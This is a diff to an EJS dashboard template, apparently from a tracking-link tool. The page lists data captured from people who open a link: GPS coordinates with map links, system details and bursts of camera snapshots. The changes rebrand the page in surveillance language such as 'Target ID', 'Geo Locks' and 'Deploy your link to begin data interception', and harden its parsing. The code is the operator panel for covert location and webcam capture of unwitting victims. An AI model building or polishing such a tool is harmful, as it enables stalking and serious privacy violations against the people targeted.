@@ -17,16 +17,16 @@
     <div class="container">
         <header class="header" data-aos="fade-down">
             <h1>Analytics</h1>
-            <p>Real-time insights for tracking ID: <span style="color: var(--accent); font-weight: 700;">
+            <p>Target ID: <span style="color: var(--text-main); font-weight: 700; font-family: monospace;">
                     <%= userId %>
                 </span></p>
             <div style="margin-top: 30px; display: flex; justify-content: center; gap: 20px;">
                 <a href="/" class="btn btn-secondary" style="width: auto; padding: 12px 24px; font-size: 0.9rem;">
-                    <i class="fas fa-arrow-left"></i> Home
+                    <i class="fas fa-arrow-left"></i> RETURN TO BASE
                 </a>
                 <button onclick="location.reload()" class="btn btn-primary"
                     style="width: auto; padding: 12px 24px; font-size: 0.9rem;">
-                    <i class="fas fa-sync-alt"></i> Refresh
+                    <i class="fas fa-sync-alt"></i> SYNC DATA
                 </button>
             </div>
         </header>
@@ -35,13 +35,13 @@
             <div class="dashboard-grid">
                 <!-- Stats Summary -->
                 <div class="stat-card" data-aos="zoom-in" data-aos-delay="100">
-                    <h4>Total Engagements</h4>
+                    <h4>Total Hits</h4>
                     <div class="value">
                         <%= data.length %>
                     </div>
                 </div>
                 <div class="stat-card" data-aos="zoom-in" data-aos-delay="200">
-                    <h4>Geo Captures</h4>
+                    <h4>Geo Locks</h4>
                     <div class="value">
                         <%= data.filter(e=> e.data && e.data.type === 'location').length %>
                     </div>
@@ -53,7 +53,7 @@
                     </div>
                 </div>
                 <div class="stat-card" data-aos="zoom-in" data-aos-delay="400">
-                    <h4>Visual Snapshots</h4>
+                    <h4>Visual Intel</h4>
                     <div class="value">
                         <% let snapCount=0; data.forEach(e=> {
                             if(e.data && e.data.type === 'camsnap') snapCount++;
@@ -66,20 +66,25 @@
                 <!-- Main Activity Feed -->
                 <div class="data-table" data-aos="fade-up">
                     <div
-                        style="padding: 25px 30px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
-                        <h3 style="font-family: var(--font-heading); font-size: 1.5rem;">Activity Feed</h3>
-                        <span style="color: var(--text-dim); font-size: 0.8rem;">
-                            <%= data.length %> entries recorded
+                        style="padding: 20px 24px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
+                        <h3
+                            style="font-family: var(--font-heading); font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px;">
+                            Live Feed</h3>
+                        <span style="color: var(--text-dim); font-size: 0.8rem; font-family: monospace;">
+                            [ <%= data.length %> RECORDS ]
                         </span>
                     </div>
 
-                    <% // Enhanced Grouping Logic for Snapshots const entries=[]; const groupedSnaps=new Map();
+                    <% // Enhanced Grouping Logic for Snapshots const entries=[]; const groupedSnaps=new Map(); //
+                        Helper to safely get timestamp const getTs=(entry)=> new Date(entry.timestamp ||
+                        Date.now()).getTime();
+
                         data.forEach(entry=> {
                         if (!entry || !entry.data) return; // Super defensive check
 
                         if (entry.data.type === 'camsnap') {
                         // Group snapshots taken within 10 seconds of each other
-                        const time = new Date(entry.timestamp).getTime();
+                        const time = getTs(entry);
                         const roundedTime = Math.floor(time / 10000) * 10000;
 
                         if (!groupedSnaps.has(roundedTime)) {
@@ -107,17 +112,16 @@
                         });
 
                         // Sort final list by latest first
-                        entries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                        entries.sort((a, b) => getTs(b) - getTs(a));
                         %>
 
                         <% entries.forEach((entry, idx)=> { %>
-                            <div class="table-row" data-aos="fade-up" data-aos-delay="<%= idx * 50 %>">
+                            <div class="table-row" data-aos="fade-up" data-aos-delay="<%= Math.min(idx * 50, 1000) %>">
                                 <div class="entry-meta">
                                     <div class="entry-time">
-                                        <%= new Date(entry.timestamp).toLocaleTimeString([], {hour: '2-digit' ,
-                                            minute:'2-digit', second:'2-digit'}) %>
-                                            <br>
-                                            <span style="font-size: 0.7rem; opacity: 0.6;">
+                                        <%= new Date(entry.timestamp).toLocaleTimeString([], {hour12: false,
+                                            hour: '2-digit' , minute:'2-digit', second:'2-digit'}) %>
+                                            <span style="opacity: 0.5; margin-left: 5px;">
                                                 <%= new Date(entry.timestamp).toLocaleDateString() %>
                                             </span>
                                     </div>
@@ -139,20 +143,23 @@
                                                 <span>Accuracy</span>
                                                 <p>± <%= entry.data.accuracy %>m</p>
                                             </div>
-                                            <a href="https://www.google.com/maps?q=<%= entry.data.latitude %>,<%= entry.data.longitude %>"
-                                                target="_blank" class="info-item"
-                                                style="text-decoration: none; border: 1px solid var(--accent);">
-                                                <span style="color: var(--accent);">Interactive Map</span>
-                                                <p style="color: var(--accent);">View Location <i
-                                                        class="fas fa-external-link-alt" style="font-size: 0.8rem;"></i>
-                                                </p>
-                                            </a>
+                                            <div class="info-item" style="border: none;">
+                                                <a href="https://www.google.com/maps?q=<%= entry.data.latitude %>,<%= entry.data.longitude %>"
+                                                    target="_blank"
+                                                    style="color: var(--text-main); text-decoration: underline; font-size: 0.9rem; font-family: monospace;">
+                                                    OPEN MAP VIEW <i class="fas fa-external-link-alt"
+                                                        style="font-size: 0.7rem; margin-left: 5px;"></i>
+                                                </a>
+                                            </div>
                                         </div>
 
                                         <% } else if (entry.data.type==='info' ) { %>
                                             <div class="info-grid">
-                                                <% const parts=entry.data.content.split('<br>');
+                                                <% // Robust parsing that handles missing content if
+                                                    (entry.data.content) { const parts=entry.data.content.split('<br>');
                                                     parts.forEach(part => {
+                                                    // Improved regex to capture key-value pairs more reliably
+                                                    // Matches "<b>Key:</b> Value" pattern
                                                     const match = part.match(/<b>(.+?):<\ /b>\s*(.*)/);
                                                             if (match) {
                                                             %>
@@ -164,7 +171,13 @@
                                                                     <%= match[2] || 'N/A' %>
                                                                 </p>
                                                             </div>
-                                                            <% } }); %>
+                                                            <% } }); } else { %>
+                                                                <div class="info-item">
+                                                                    <span>Raw Data</span>
+                                                                    <p style="opacity: 0.5;">No system details captured.
+                                                                    </p>
+                                                                </div>
+                                                                <% } %>
                                             </div>
 
                                             <% } else if (entry.data.type==='camsnap_group' ) { %>
@@ -172,12 +185,14 @@
                                                     <% entry.data.images.forEach(img=> { %>
                                                         <div class="snapshot-card"
                                                             onclick="window.open('/data/<%= img.filename %>', '_blank')">
-                                                            <img src="/data/<%= img.filename %>" alt="Snapshot">
+                                                            <img src="/data/<%= img.filename %>" alt="Snapshot"
+                                                                loading="lazy">
                                                         </div>
                                                         <% }) %>
                                                 </div>
-                                                <p style="margin-top: 10px; font-size: 0.8rem; color: var(--text-dim);">
-                                                    Captured <%= entry.data.images.length %> burst snapshots
+                                                <p
+                                                    style="margin-top: 10px; font-size: 0.75rem; color: var(--text-dim); font-family: monospace;">
+                                                    [ BURST SEQUENCE: <%= entry.data.images.length %> FRAMES CAPTURED ]
                                                 </p>
                                                 <% } %>
                                 </div>
@@ -189,39 +204,45 @@
             <% } else { %>
                 <!-- Empty State -->
                 <div class="card" style="text-align: center; padding: 100px 40px;" data-aos="zoom-in">
-                    <i class="fas fa-radar fa-5x" style="color: var(--accent); opacity: 0.2; margin-bottom: 30px;"></i>
-                    <h3 style="font-family: var(--font-heading); font-size: 2rem; margin-bottom: 20px;">No Signal
-                        Detected</h3>
-                    <p style="color: var(--text-dim);">We are standing by for incoming data. Once a user clicks your
-                        tracking link, the analytics will populate automatically here.</p>
+                    <i class="fas fa-satellite-dish"
+                        style="color: var(--border); font-size: 4rem; margin-bottom: 30px;"></i>
+                    <h3
+                        style="font-family: var(--font-heading); font-size: 1.5rem; margin-bottom: 10px; text-transform: uppercase;">
+                        Awaiting Signal</h3>
+                    <p style="color: var(--text-dim); max-width: 400px; margin: 0 auto;">
+                        Target ID <span style="color: var(--text-main); font-family: monospace;">
+                            <%= userId %>
+                        </span> is currently silent.
+                        Deploy your link to begin data interception.
+                    </p>
                     <div style="margin-top: 40px;">
                         <div
-                            style="display: flex; align-items: center; justify-content: center; gap: 10px; color: var(--accent); font-weight: 600;">
+                            style="display: flex; align-items: center; justify-content: center; gap: 10px; color: var(--success); font-weight: 600; font-family: monospace; font-size: 0.9rem;">
                             <span class="spinner"
-                                style="border-width: 2px; width: 15px; height: 15px; margin-left: 0;"></span>
-                            Monitoring Connection...
+                                style="border-width: 2px; width: 10px; height: 10px; margin-left: 0; border-color: var(--success); border-right-color: transparent;"></span>
+                            SCANNING NETWORK...
                         </div>
                     </div>
                 </div>
                 <% } %>
 
-                    <footer style="margin-top: 80px; text-align: center; color: var(--text-dim); font-size: 0.8rem;">
-                        &copy; 2024 ANTI-GRAVITY SYSTEM | PREMIUM ANALYTICS ENGINE
+                    <footer
+                        style="margin-top: 80px; text-align: center; color: var(--text-dim); font-size: 0.75rem; font-family: monospace;">
+                        SYSTEM STATUS: ONLINE | ENCRYPTION: AES-256
                     </footer>
     </div>
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
         AOS.init({
-            duration: 800,
+            duration: 600,
             once: true,
-            offset: 50
+            offset: 30
         });
 
         // Auto Refresh
         setInterval(() => {
-            // Only refresh if no data yet to catch the first hit, 
-            // or every 30 seconds for active dashboard
+            // Reload page to check for new data
             location.reload();
         }, 30000);
     </script>
